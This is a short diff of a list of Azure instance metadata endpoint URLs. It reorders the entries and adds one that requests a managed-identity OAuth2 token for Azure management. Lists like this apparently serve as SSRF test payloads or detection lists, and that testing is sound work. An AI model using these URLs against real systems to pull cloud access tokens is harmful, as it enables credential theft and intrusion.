@@ -1,7 +1,8 @@
-http://169.254.169.254/metadata/instance
-http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/attested/document
 http://169.254.169.254/metadata/identity/oauth2/token
 http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
-http://169.254.169.254/metadata/scheduledevents
-http://169.254.169.254/metadata/attested/document
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+http://169.254.169.254/metadata/instance
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
 http://169.254.169.254/metadata/loadbalancer
+http://169.254.169.254/metadata/scheduledevents
